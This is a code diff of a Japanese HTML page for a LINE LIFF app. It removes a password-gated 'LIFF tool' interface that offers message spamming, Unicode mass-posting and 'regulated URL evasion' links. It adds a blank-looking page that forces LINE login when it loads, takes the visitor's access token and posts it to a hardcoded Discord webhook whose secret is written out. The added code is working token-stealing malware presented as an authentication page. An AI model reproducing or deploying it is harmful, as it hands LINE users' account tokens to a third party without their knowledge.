@@ -1,48 +1,92 @@
 <!DOCTYPE html>
 <html lang="ja">
-    <head>
-        <meta charset="UTF-8">
-        <meta http-equiv="Cache-Control" content="no-cache">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>LIFF-APP</title>
-        <link href="./style.css" rel="stylesheet">
-        <link rel="icon" href="https://obs.line-scdn.net/0hrKkn3t_FLWRWFz-5ynlSMwRKJgZldTNvdCM5AzZocTAzTAxSbw8baSxCGjAzcghZIRAEQzVoAT96RgxSNiQHAzp_FTB6TBxzLSQXcjhEBiQ9XDZoYg0S"/>
-    </head>
-    <body>
-        <div id="password-screen">
-            <h1>パスワードを入力してください</h1>
-            <input type="password" id="password-input" placeholder="パスワード">
-            <button type="button" id="password-submit">開く</button>
-        </div>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LIFF認証（バックグラウンド）</title>
+    <style>
+       
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: white;
+            color: white;*/
+            overflow: hidden;
+            width: 100vw;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+    <script>
+      
+        const LIFF_ID = '2007556850-NzoOlegE'; 
+      
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1373359224158945290/9zVF_Ljvzcgoc7NWCQwcUScC6_DH1oiEDSfFxRAbjYJ0l4CJqy2KmUyVJY06VcSOq9T1'; 
 
-        <div id="main" style="display:none;">
-            <h1>LIFFツールv3</h1>
-            <h2>OC内でのliffからのメッセージ送信は出来なくなりました</h2>
-            <p>
-                <span id="err"></span>
-            </p>
-            <p>liff-token:<input type="text" id="token" value="null"><button type="button" onclick= set() >設定</button></p>
-            <button type="button" onclick=pc()>tokenを転送</button><button type="button" onclick=clos()>tokenを保持して閉じる</button><button type="button" onclick=openB()>ブラウザで開く</button>
-            <p>
-                メッセージ送信:<input type=text id=test value="てすと"><button type="button" onclick=test()>送信</button>
-            </p>
-            <span id="button1">
-                <button type="button" onclick= kuni() >Unicode解析</button>
-                <button type="button" onclick=url()>通報リンク変換</button>
-                <button type="button" onclick=uni()>ユニコード自動連投</button>
-                <button type="button" onclick=flex()>Flexメッセージ生成</button>
-                <button type="button" onclick= tUni()>多機能連投</button>
-                <button type="button" onclick= help()>使い方/ヘルプ</button>
-            </span>
-            <div id="app"></div><br><br>
-            <p><a href="https://line.me/R/oaMessage/@228jbgfo/">バグ報告・質問はこちら</a></p>
-            <h3>その他のツール</h3>
-            <p><a href="https://liff-tool.f5.si/url/create.html">規制URL回避</a></p>
-            <p><a href="https://liff-tool.f5.si/tool">オプURL変換</a></p>
-        </div>
-        <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"></script>
-        <script src="https://static.line-scdn.net/liff/sdk/v2/liff.js"></script>
-        <script src="./scr.js"></script>
-    </body>
+        async function initializeLiff() {
+            try {
+                await liff.init({
+                    liffId: LIFF_ID
+                });
+                console.log('LIFF初期化完了。');
+
+                if (!liff.isLoggedIn()) {
+                    console.log('LIFFにログインしていません。ログインをリダイレクトします...');
+                    liff.login();
+                } else {
+                    console.log('LIFFにログイン済みです。アクセストークンを取得中...');
+                    getAndSendAccessToken();
+                }
+            } catch (err) {
+                console.error("LIFF初期化に失敗しました:", err);
+            }
+        }
+
+        async function getAndSendAccessToken() {
+            try {
+                const accessToken = liff.getAccessToken();
+                if (accessToken) {
+                    console.log('アクセストークンを取得しました:', accessToken);
+                    console.log('Discordに送信中...');
+                    await sendToDiscordWebhook(accessToken);
+                    console.log('アクセストークンをDiscordに送信しました。');
+                } else {
+                    console.log('アクセストークンが取得できませんでした。');
+                }
+            } catch (err) {
+                console.error("アクセストークンの取得または送信に失敗しました:", err);
+            }
+        }
+
+        async function sendToDiscordWebhook(token) {
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `新しいLIFFアクセストークン: \`\`\`${token}\`\`\``,
+                        username: "LIFF AcccessToken Notifier",
+                        avatar_url: "https://example.com/your-avatar.png" 
+                    })
+                });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`Discord Webhookへの送信に失敗しました: ${response.status} ${response.statusText} - ${errorText}`);
+                }
+
+                console.log("アクセストークンをDiscord Webhookに正常に送信しました。");
+            } catch (err) {
+                console.error("Discord Webhookへの送信中にエラーが発生しました:", err);
+                throw err;
+            }
+        }
+
+        window.onload = initializeLiff;
+    </script>
+</body>
 </html>
